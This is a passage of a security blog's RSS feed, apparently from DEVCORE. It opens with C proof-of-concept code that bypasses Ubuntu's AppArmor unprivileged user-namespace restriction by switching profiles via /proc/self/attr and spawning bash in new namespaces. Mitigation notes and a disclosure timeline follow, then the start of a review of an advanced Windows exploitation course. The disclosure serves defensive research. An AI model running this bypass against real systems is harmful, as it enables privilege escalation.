    &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;unshare_setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unshare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLONE_NEWNET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLONE_NEWUSER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/setgroups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/setgroups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;deny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;deny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/uid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/uid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0 %d 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/gid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/gid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0 %d 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec opam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;changeprofile opam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/attr/exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/attr/exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/attr/current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/attr/current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;unshare_setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;func_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;6-mitigation&quot;&gt;6. Mitigation&lt;/h2&gt;

&lt;p&gt;The bypass method works only when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined&lt;/code&gt; is disabled (i.e., set to 0). Versions of Ubuntu later than 25.04 are not affected, as it is enabled by default.&lt;/p&gt;

&lt;p&gt;For Ubuntu 24.10 and earlier versions, please refer the &lt;a href=&quot;https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes&quot;&gt;official post&lt;/a&gt; for instructions on how to prevent any unprivileged and unconfined process from executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-exec&lt;/code&gt; to change its profile.&lt;/p&gt;

&lt;h2 id=&quot;7-disclosure-timeline&quot;&gt;7. Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2025-02-16: Researcher @roddux mentioned that the namespace restriction is easy to bypass.&lt;/li&gt;
  &lt;li&gt;2025-02-17: I discovered the bypass method.&lt;/li&gt;
  &lt;li&gt;2025-02-24: I reported the issue to the ZDI team.&lt;/li&gt;
  &lt;li&gt;2025-03-21: Researcher @roddux published his bypass method.&lt;/li&gt;
  &lt;li&gt;2025-03-27: The Qualys team, upon noticing @rodduxâ€™s publication, also disclosed their advisory.&lt;/li&gt;
  &lt;li&gt;2025-04-27: The ZDI team responded that they are not interested in this type of bug.&lt;/li&gt;
  &lt;li&gt;2025-04-30: I reported the issue to the Ubuntu Security Team.&lt;/li&gt;
  &lt;li&gt;2025-05-01: John, one of the maintainers, notified me that it had entered the initial review stage.&lt;/li&gt;
  &lt;li&gt;2025-05-30: John provided a full analysis of the issue.&lt;/li&gt;
  &lt;li&gt;2025-06-26: Coordinated release.&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/</link>
                <guid>https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en</guid>
                <pubDate>Thu, 26 Jun 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OSEE Exam Uncovered: Cracking OSEE in Taipei</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2025/05/27/osee-exam-uncovered-cracking-osee-in-taipei/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In August 2024, DEVCORE and OffSec held a live training event in Taipei, offering four courses: SOC-200, WEB-200, PEN-200, and EXP-401. This was the first time OffSec held a live training in Taiwan.&lt;/p&gt;

&lt;p&gt;Naturally, the course I was most interested in was EXP-401, also known as Advanced Windows Exploitation (AWE). Most people know it by its certification name, â€œOSEE.â€&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;OSEE is considered OffSecâ€™s hardest certification. As of now, only about 100â€“200 people worldwide hold this certification, and the pass rate is around 10%. Weâ€™ve always been curious just how tough this legendary cert really is. After all, how hard could a certification be?&lt;/p&gt;

&lt;p&gt;At DEVCORE, we started early on by asking how many people in Taiwan would be interested if an OSEE course were available locally. My first thought was: â€œEven if I have to dig into my pockets, Iâ€™m in!â€  The reasons were simple:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;OSEE is &lt;strong&gt;only offered in-person&lt;/strong&gt;, with no online version available&lt;/li&gt;
  &lt;li&gt;In the past, attending this course meant &lt;strong&gt;having to go abroad&lt;/strong&gt;, with the most well-known session being the annual Black Hat USA training.&lt;/li&gt;
  &lt;li&gt;Itâ€™s extremely hard to sign up, and some people even write scripts to secure their seats.&lt;/li&gt;
  &lt;li&gt;Regardless of exam results, it would be a first for Taiwan: either the first OSEE holder or the first to fail, both an achievement.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;OffSecâ€™s official site has a page listing all their live training sessions: &lt;a href=&quot;https://www.offsec.com/training-and-events/&quot;&gt;Upcoming Live Training &amp;amp; Events | OffSec&lt;/a&gt;. The most well-known EXP-401 session is held every August at Black Hat USA in Las Vegas. Rough math says that the round-trip airfare from Taipei to Vegas plus hotel for the week costs a small fortune, so taking the class in Taipei easily saves more than NT$100k on travel alone. Absolutely worth it.&lt;/p&gt;

&lt;p&gt;All things considered, I think this was the best training course Iâ€™ve ever attended, and I highly recommend it. Even if youâ€™re not focused on Windows research, you will still enjoy it. The goal neednâ€™t be earning the OSEE (though passing would be awesome) certification. The class experience itself is fantastic.&lt;/p&gt;

&lt;h2 id=&quot;course-overview&quot;&gt;Course Overview&lt;/h2&gt;

&lt;p&gt;EXP-401 (OSEE) is the only â€œExpert-levelâ€ course from OffSec, and itâ€™s widely recognized as the most difficult certification with the lowest pass rate. You can find its position in Paul Jerimyâ€™s &lt;a href=&quot;https://pauljerimy.com/security-certification-roadmap/&quot;&gt;Security Certification Roadmap&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_8c455085eb6be1da05d6f11ed8b5ad8a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EXP-401 is focused on advanced â€œWindows exploitation techniques.â€ Modern Windows systems are equipped with various security mitigations (e.g., DEP, ASLR, CFG, ACG, CET), and the course walks students through bypassing these protections, developing working exploits in environments with single or multiple protections enabled. Some highlights of the course include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;In-person only&lt;/strong&gt;: Unlike other OffSec courses, this one is not available online. The instructor relies heavily on interacting with students, so physical presence is required.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Real-world focus&lt;/strong&gt;: The course uses real-world enterprise-level applications like VMware and Edge as targets for analysis.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Deep Windows content&lt;/strong&gt;: Topics include user-mode and kernel-mode exploitation, advanced heap manipulation, VM escape, sandbox escape, and kernel driver reverse engineering.&lt;/li&gt;
